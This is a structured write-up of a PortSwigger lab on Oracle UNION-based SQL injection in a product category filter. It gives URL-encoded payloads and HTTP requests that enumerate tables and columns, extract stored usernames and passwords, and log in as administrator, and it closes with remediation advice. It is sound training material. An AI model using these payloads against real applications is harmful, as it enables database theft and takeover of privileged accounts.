
---
# SQL Injection in Product Filtering allows Retrieval of Database Contents

## 1. Executive Summary

A SQL injection vulnerability exists in the product category filtering functionality, allowing attacker-controlled input to modify the underlying SQL query. Because the backend uses an Oracle database, an attacker can exploit the injection with `UNION SELECT` and the Oracle `dual` table to enumerate database tables, identify the table containing user credentials, retrieve usernames and passwords, and ultimately authenticate as the administrator.

## 2. Vulnerability Details

- **Vulnerability Type:** SQL Injection (SQLi) — Database Enumeration and Credential Extraction
    
- **Target Endpoint/URL:** `/filter`
    
- **Affected Parameter(s):** `category`
    
- **Authentication Level Required:** Unauthenticated
    
- **Backend Database:** Oracle
    

The application incorporates the `category` parameter into a SQL query without properly parameterizing the input.

Oracle requires every `SELECT` statement to contain a `FROM` clause. Therefore, when using `UNION SELECT`, the Oracle built-in `dual` table can be used as the data source:

```
UNION SELECT 'abc','def' FROM dual
```

The vulnerability allows an attacker to progress from identifying the query structure to enumerating tables, discovering credential columns, extracting credentials, and accessing the administrator account.

## 3. Steps to Reproduce (STR)

### Step 1 — Intercept the category request

1. Access the PortSwigger lab.
    
2. Navigate to the product listing page.
    
3. Select a product category.
    
4. Intercept the request using Burp Suite.
    
5. Locate the `category` parameter.
    

### Step 2 — Determine the number of columns and text-compatible columns

6. Test the SQL injection point using a `UNION SELECT` payload.
    
7. For this lab, the query returns **two columns**, and both columns accept text.
    
8. Use the following payload:
    

```
'+UNION+SELECT+'abc','def'+FROM+dual--
```

The underlying SQL is conceptually equivalent to:

```
SELECT ...
UNION SELECT 'abc', 'def' FROM dual--
```

9. Send the request.
    
10. Confirm that both `abc` and `def` appear in the application's response.
    
11. This confirms that:
    
    - The original query returns two columns.
        
    - Both columns can contain text.
        
    - The Oracle `dual` table can be used for the `UNION SELECT`.
        

### Step 3 — Enumerate database tables

12. Use Oracle's `all_tables` view to retrieve table names.
    
13. Replace the `category` value with:
    

```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

14. Send the request.
    
15. Examine the response for table names.
    
16. Identify the table containing user credentials.
    

The table name is typically randomized in the lab, for example:

```
USERS_ABCDEF
```

### Step 4 — Enumerate the credential table's columns

17. Query Oracle's `all_tab_columns` view.
    
18. Replace the table name with the credential table discovered in the previous step:
    

```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

19. Send the request.
    
20. Examine the response.
    
21. Identify the columns containing usernames and passwords.
    

For example:

```
USERNAME_ABCDEF
PASSWORD_ABCDEF
```

### Step 5 — Retrieve usernames and passwords

22. Use the discovered table and column names in a `UNION SELECT` query:
    

```
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

23. Send the request.
    
24. Examine the response for the usernames and corresponding passwords.
    
25. Locate the `administrator` account.
    
26. Record the administrator password.
    

### Step 6 — Authenticate as administrator

27. Navigate to the application's login page.
    
28. Enter the discovered administrator username.
    
29. Enter the corresponding password retrieved through the SQL injection.
    
30. Submit the login form.
    
31. Confirm successful authentication as the administrator.
    
32. The PortSwigger lab is now solved.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

#### 1. Confirm two text-compatible columns

```
GET /filter?category='+UNION+SELECT+'abc','def'+FROM+dual-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

The Oracle query is conceptually:

```
SELECT ...
UNION SELECT 'abc', 'def'
FROM dual--
```

The response contains:

```
abc
def
```

This confirms the two-column structure.

#### 2. Enumerate tables

```
GET /filter?category='+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

Conceptually:

```
SELECT ...
UNION SELECT table_name, NULL
FROM all_tables--
```

The response exposes available table names, including the table containing user credentials.

#### 3. Enumerate columns

Assuming the credential table is `USERS_ABCDEF`:

```
GET /filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

The response reveals the table's columns, including:

```
USERNAME_ABCDEF
PASSWORD_ABCDEF
```

#### 4. Extract credentials

```
GET /filter?category='+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

Conceptually:

```
SELECT ...
UNION
SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF
FROM USERS_ABCDEF--
```

The response exposes the stored usernames and passwords.

The administrator credentials can then be used to authenticate to the application.

### Evidence (Screenshots/Video)


## 5. Impact Analysis

- **Technical Impact:** An unauthenticated attacker can exploit SQL injection to enumerate Oracle database metadata, identify application tables and columns, extract usernames and passwords, and authenticate as the administrator.
    
- **Business Impact:** Credential disclosure can result in complete compromise of privileged application accounts. An attacker gaining administrator access may be able to access sensitive information, modify application data or configuration, manage users, and perform other privileged actions.
    

The demonstrated impact is therefore significantly more severe than simple database fingerprinting: **the vulnerability enables credential extraction followed by administrator account compromise.**

## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements for all database operations involving user-controlled input. User input must never be concatenated directly into SQL statements.
    

For example:

```
cursor.execute(
    "SELECT * FROM products WHERE category = :category",
    {"category": category}
)
```

Additional security controls should include:

- Use parameterized queries or prepared statements.
    
- Never construct SQL statements through string concatenation.
    
- Apply least-privilege permissions to the application's Oracle database account.
    
- Restrict access to database metadata where practical.
    
- Never return database errors or sensitive database information to users.
    
- Store passwords using strong, salted password-hashing algorithms rather than plaintext.
    
- Implement appropriate server-side input validation as defense in depth.
    

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection Prevention Cheat Sheet
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - PortSwigger Web Security Academy — SQL Injection